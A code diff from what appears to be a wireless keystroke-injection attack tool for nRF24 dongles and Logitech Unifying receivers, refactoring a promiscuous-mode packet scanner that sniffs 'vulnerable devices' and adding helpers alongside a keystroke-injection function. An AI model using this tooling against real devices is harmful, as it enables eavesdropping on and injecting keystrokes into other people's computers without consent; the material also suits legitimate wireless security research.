@@ -8,7 +8,10 @@ from .hid_scan_codes import *
 from . import logitech
 import time
 
-PING_PAYLOAD = [0x0F, 0x0F, 0x0F, 0x0F]
+# constants
+PING_PAYLOAD = [0x0F, 0x0F, 0x0F, 0x0F] # the arbitrary ping payload used in find_frequency_channel()
+CHANNELS = range(2, 84) # the range of channels for channel sweeping and scanning (why this range was chosen is explained in find_frequency_channel())
+DWELL_TIME = 0.1 # how long (in seconds) the radio listens for packets per channel, in scan()
 
 def find_frequency_channel(radio, address):
     """
@@ -32,7 +35,7 @@ def find_frequency_channel(radio, address):
     # is 2481. So we can expect the channels to be between 2 and 81, thus reducing scanning time (for Logitech Unifying, the bound is even tighter -
     # 2402 - 2474).
     # To be more safe, an upper bound of 84 is used, based on: https://github.com/BastilleResearch/nrf-research-firmware/blob/master/tools/lib/common.py#L33
-    for channel in range(2, 84):
+    for channel in CHANNELS:
         radio.set_channel(channel)
         if radio.transmit_payload(PING_PAYLOAD): # transmitting the payload; the function returns true if a response was received
             print(f'found channel: {channel}')
@@ -72,41 +75,38 @@ def transmit_keys(radio, keys, vendor=logitech):
     keystrokes = [other_keys[name] for name in keys if name in other_keys.keys()] # using the other_keys dictionary (that's why characters are not allowed), eliminating key names that aren't in the dictionary
     vendor.inject_keystrokes(radio, add_key_releases(keystrokes)) # calling the vendor's function to inject keystrokes, adding key release packets using the utility function if necessary
 
+def scan(radio, duration=20):
+    """
+    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack)
+    and the duration of the scanning process (in seconds). It performs a scan that detects radio packets transmitted from vulnerable devices,
+    by using the promiscuous mode implemented in the firmware, that allows the attacking dongle to receive any valid frame from any address.
+    """
 
-def scan(radio, timeout=5.0):
-    radio.enter_promiscuous_mode()
-    channel = 2
-    radio.set_channel(channel)
-    dwell_time = 0.1
-    last_tune = time.time()
-    start_time = time.time()
+    radio.enter_promiscuous_mode() # sending a command to enter promiscuous mode
 
-    results_set = set() # create an empty Set to store results
+    # starting from the first channel
+    channel_index = 0
+    radio.set_channel(CHANNELS[channel_index])
 
-    while time.time() - start_time < timeout:
-        if  time.time() - last_tune > dwell_time:
-            channel = ((channel + 1) % 83) if ((channel + 1) % 83) >= 2 else 2
-            radio.set_channel(channel)
-            last_tune = time.time()
+    last_channel_switch = time.time() # variable to store the last time the radio switched to another channel (time.time() returns the current time)
+    start_time = time.time() # variable to store the time in which the scan has started
+    
+    while time.time() - start_time < duration: # repeating as long as the time passed since the beginning of the scan has not exceeded the desired duration
+        if time.time() - last_channel_switch > DWELL_TIME: # if our time on the current channel has expired, switching to the next channel
+            channel_index = (channel_index + 1) % len(CHANNELS) # using mod because we may go through the entire range of channels multiple times
+            radio.set_channel(CHANNELS[channel_index])
+            last_channel_switch = time.time() # updating the variable
+            
+        value = radio.receive_payload() # trying to receive a payload on the current channel
+        if len(value) >= 5: # meaning that the packet at least contains an RF address
+            address, payload = value[0:5], value[5:] # splitting the packet - address is first 5 bytes, payload is the rest
+            if len(payload) > 0: # some packets containing only an address without a payload have been observed, so we don't want to print them
+                print(f"address: {format_bytes(address)}    packet: {format_bytes(payload)}")
 
-        try:
-            value = radio.receive_payload()
-        except RuntimeError:
-            value = []
-        if len(value) >= 5:
-            address, payload = value[0:5], value[5:]
-            results_set.add((address, payload)) # add the address, payload pair to the Set
-            print("ch: %02d addr: %s packet: %s" % (channel, to_display(address), to_display(payload)))
+def format_bytes(data):
+    # e.g. the payload: [0x00, 0xC1, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3B] is formatted as: 00:C1:00:04:00:00:00:00:00:3B
+    return ':'.join('{:02X}'.format(b) for b in data)
 
-
-def start_scanning(radio):
-    print('Scanning for signals...')
-    try:
-        while True:
-            scan(radio, timeout=60)
-    except KeyboardInterrupt:
-        print('\n(^C) interrupted\n')
-        print('[-] Quitting')
-
-def to_display(data):
-    return ':'.join('{:02X}'.format(x) for x in data)
+def address_str_to_bytes(rf_address):
+    # e.g. E4:ED:AE:B8:B4 is converted to: [0xB4, 0xB8, 0xAE, 0xED, 0xE4]
+    return list(bytes.fromhex(rf_address.replace(':', '')))[::-1]
